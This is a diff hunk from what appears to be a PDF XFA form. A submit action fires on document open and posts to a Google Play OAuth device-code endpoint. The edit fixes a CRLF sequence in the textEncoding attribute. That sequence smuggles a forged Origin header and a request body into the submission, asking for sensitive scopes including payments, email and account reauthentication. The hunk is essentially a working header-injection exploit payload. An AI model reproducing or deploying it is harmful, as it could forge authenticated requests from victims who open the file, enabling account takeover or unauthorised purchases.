@@ -18,7 +18,7 @@ stream
         <field id="Hello World!">
             <event activity="docReady" ref="$host" name="event__click">
                <submit 
-                     textEncoding="UTF-8&#xD;&#xA;Origin: .google.com/aa\raaa:aa&#xD;&#xA;&#xD;&#xA;client_id=905089343179-lr5hmid2phmf0j6sf0nno6le2i5th0ob.apps.googleusercontent.com&#x26;scope=https://www.googleapis.com/auth/android_video https://www.googleapis.com/auth/payments.video_purchase https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/accounts.reauth&#x26;redirect_uri=https://play.google.com/movie-device&#x26;"
+                     textEncoding="UTF-8&#xD;&#xA;Origin: .google.com/aa\r\naaa:aa&#xD;&#xA;&#xD;&#xA;client_id=905089343179-lr5hmid2phmf0j6sf0nno6le2i5th0ob.apps.googleusercontent.com&#x26;scope=https://www.googleapis.com/auth/android_video https://www.googleapis.com/auth/payments.video_purchase https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/accounts.reauth&#x26;redirect_uri=https://play.google.com/movie-device&#x26;"
                      xdpContent="pdf datasets template"
                      target="https://play.google.com/video/avi/o/oauth2/device/code"/>
             </event>
